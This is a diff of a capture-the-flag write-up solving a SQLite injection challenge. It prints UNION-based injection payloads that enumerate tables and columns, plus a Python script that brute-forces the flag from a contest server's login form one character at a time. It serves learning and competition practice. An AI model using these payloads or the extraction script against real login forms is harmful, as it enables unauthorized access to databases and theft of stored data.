@@ -2,7 +2,7 @@
 
 <img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/image3.PNG>
 
-Enumerating through the website i found <b>robots.txt</b>
+Enumerating through the website i found ```<b>robots.txt</b>```
 And got this code:
 
 ```py
@@ -63,27 +63,62 @@ def page_not_found(e):
 app.run(host="0.0.0.0", port=8000)
 ```
 
-It was obvious that its SQLite injection but to be sure lets detect the injection point:
+It was obvious that it was SQLite injection, but to be sure, let's detect the injection point:
 <img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/Capture2.PNG>
-after we put <b>'</b> we got this Error:
+after we put ```<b>'</b>``` we got this Error:
 <img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/Capture3.PNG>
 
 
 
-Next we need to find number of columns using this payload:
+Next, we need to find the number of columns using this payload:
 ```admin'UNION+SELECT+NULL,NULL,NULL--```
-I found that its only 3 columns throught enumerating.
-and when i got that the database has 3 tables a new repsone got to us:
+I found that there were only 3 columns through enumeration.
+and when I got that the database has 3 tables, a new representative got to us:
 <img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/Capture4.PNG>
-
+```which is the valid one :)```
 
 <b>Here is the final take "there are 7 billions people and I have 0 chance,read it from the end"</b>
 
-from that we knew that its time based sqlite injection, so lets get to work:
+From that, we knew that it was boolean-based sqlite injection, so let's get to work:
+
 
 first we need to find the name of the table using this query:
 ```<b>username=admin'UNION+SELECT+tbl_name,NULL,NULL+FROM+sqlite_master+WHERE+tbl_name+NOT+LIKE+'sqlite_%'+AND+tbl_name+LIKE+'fla%'+--&password=asd</b>```
 
-throught enumeration we found that the table name is flag.
+throught enumerating the ```LIKE``` value we found that the table name is ```flag```.
 
+after that we need to find the column name!
+i honestly guessed that the coloumn name was ```flag``` i think thats has to do.
+i used this query to guess it:
+```admin'UNION+SELECT+flag,NULL,NULL+FROM+flag--```
+and got a valid response:
+<img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/Capture5.PNG>
+
+
+finally we have to exract the flag using this query:
+```admin'UNION+SELECT+0x660x6c0x610x67,NULL,NULL+FROM+flag+WHERE+flag+LIKE+'securinets{%'--```
+<img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/Capture6.PNG>
+
+we have to keep enumerating the ```LIKE``` value until we get our full flag.
+so i wrote this script to do the work
+
+```py
+from requests import *
+from string import *
+url = "http://51.12.211.165:8200/admin"
+ans=""
+
+pr="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}"
+for i in pr:
+    data = {
+    "username": "admin' UNION SELECT 0x660x6c0x610x67,NULL,NULL FROM flag WHERE flag LIKE 'securinets{luCK_"+(ans+i)+"%'--",
+    "password": "asd"}
+
+    p=post(url,data=data)
+    if p.status_code==200:
+        ans+=i
+        print(ans)
+```
+
+running the script we got the flag: ```securinets{Luck_15_n00b5_b3l13f5}```
 
